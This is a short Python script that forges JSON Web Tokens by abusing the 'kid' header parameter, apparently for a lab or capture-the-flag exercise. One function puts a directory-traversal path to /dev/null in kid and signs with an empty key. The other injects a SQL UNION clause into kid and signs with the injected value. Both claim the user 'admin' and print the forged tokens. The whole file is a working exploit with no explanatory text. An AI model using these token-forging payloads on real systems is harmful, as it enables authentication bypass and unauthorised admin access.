import base64
import json
import hmac
import hashlib

# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y

def directory_traversal():

	header = base64.urlsafe_b64encode(json.dumps({"typ":"JWT","alg":"HS256","kid":"../../../../../../dev/null"}).encode('utf-8')).decode('utf-8').rstrip('=')

	payload = base64.urlsafe_b64encode(json.dumps({"user":"admin"}).encode('utf-8')).decode('utf-8').rstrip('=')

	key = ''

	signature = base64.urlsafe_b64encode(hmac.new(key.encode('utf-8'),( header+'.'+payload).encode('utf-8'), hashlib.sha256).digest()).decode('utf-8').rstrip('=')

	return header+'.'+payload+'.'+signature

def sql_injection():

	header = base64.urlsafe_b64encode(json.dumps({"typ":"JWT","alg":"HS256","kid":"blahblah' union select 'abcd"}).encode('utf-8')).decode('utf-8').rstrip('=')

	payload = base64.urlsafe_b64encode(json.dumps({"user":"admin"}).encode('utf-8')).decode('utf-8').rstrip('=')

	key = 'abcd'

	signature = base64.urlsafe_b64encode(hmac.new(key.encode('utf-8'),( header+'.'+payload).encode('utf-8'), hashlib.sha256).digest()).decode('utf-8').rstrip('=')

	return header+'.'+payload+'.'+signature


print('Directory Traversal in kid parameter: \n',directory_traversal())
print('Sql Injection in kid parameter: \n',sql_injection())